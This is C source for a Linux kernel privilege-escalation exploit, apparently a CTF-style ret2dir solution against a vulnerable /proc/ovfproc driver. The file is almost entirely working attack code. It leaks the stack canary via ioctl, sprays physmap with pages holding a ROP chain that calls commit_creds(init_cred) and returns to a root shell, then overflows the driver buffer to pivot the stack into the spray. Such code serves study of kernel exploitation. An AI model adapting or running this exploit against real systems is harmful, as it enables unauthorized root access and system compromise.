//gcc -Os -static -masm=intel exploit.c -lutil -o exploit
//home/overflow/ret2dir/exploit
#include "mykernelpwn.h"

#define pop_rdi_ret 0xffffffff8107fc70
#define pop_rsp_ret 0xffffffff811cd494
#define ret 0xffffffff8107fc71

#define init_cred 0xffffffff8265a980
#define commit_creds 0xffffffff810b7fb0
#define swapgs_restore_regs_and_return_to_usermode 0xffffffff81c00974

size_t* physmap_spray_arr[16000];
size_t  page_size;
size_t  try_hit = 0xffff880002505000;

void ovf_read(int fd, char* buf)
{
    ioctl(fd, 0x112233, buf);
}

void set_offset(int fd, long offset)
{
    ioctl(fd, 0x334455, offset);
}

void ovf_copy_func(int fd, long len)
{
    ioctl(fd, 0x223344, len);
}

void construct_rop_chain(size_t* rop)
{
    int idx = 0;
    for(; idx < 2; idx++){
        rop[idx] = ret;
    }
    rop[idx++] = pop_rdi_ret;
    rop[idx++] = init_cred;
    rop[idx++] = commit_creds;
    rop[idx++] = swapgs_restore_regs_and_return_to_usermode+22;
    rop[idx++] = 0;
    rop[idx++] = 0;
    rop[idx++] = (size_t)get_root_shell;
    rop[idx++] = user_cs;
    rop[idx++] = user_rflags;
    rop[idx++] = user_sp + 8;
    rop[idx++] = user_ss;
}

int main(int argc, char** argv)
{
    bind_core(0);
    save_status();

    int fd = open("/proc/ovfproc", 2);
    if(fd <0)
    {
        printf("\033[31m\033[1m[-] Failed to open the file: /proc/ovfproc!\033[0m\n");
        exit(-1);
    }

    // get the canary
    size_t canary;
    char buf[0x50];
    set_offset(fd, 64);
    ovf_read(fd, buf);
    canary = ((size_t *)buf)[0];
    printf("\033[32m\033[1m[+] Successful to get the value of canary: \033[0m%p\n", canary);

    page_size = sysconf(_SC_PAGESIZE);

    // construct per-page rop chain
    // mmap 函数 fd 参数为 -1 表示以匿名的方式分配空间。
    physmap_spray_arr[0] = mmap(NULL, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    construct_rop_chain(physmap_spray_arr[0]);

    // spray physmap, so that we can easily hit one of them
    note_info("Spraying physmap...");
    for (int i = 1; i < 15000; i++)
    {
        physmap_spray_arr[i] = mmap(NULL, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (!physmap_spray_arr[i])
            err_exit("Oom for physmap spray!");
        memcpy(physmap_spray_arr[i], physmap_spray_arr[0], page_size);
    }
    note_info("Trigger physmap one_gadget...");

    //construct the ropchain
    size_t rop_chain[0x100], buf_rop[0x100], i = 0;
    for(; i < 10; i++)
        rop_chain[i] = canary;
    rop_chain[i++] = pop_rsp_ret;
    rop_chain[i++] = try_hit;

    write(fd, rop_chain, 0x100);
    read(fd, buf_rop, 0x100);
    print_binary(buf_rop, 0x100);
    
    ovf_copy_func(fd, 0xffffffffffff0000 | (0x100));
    close(fd);
}
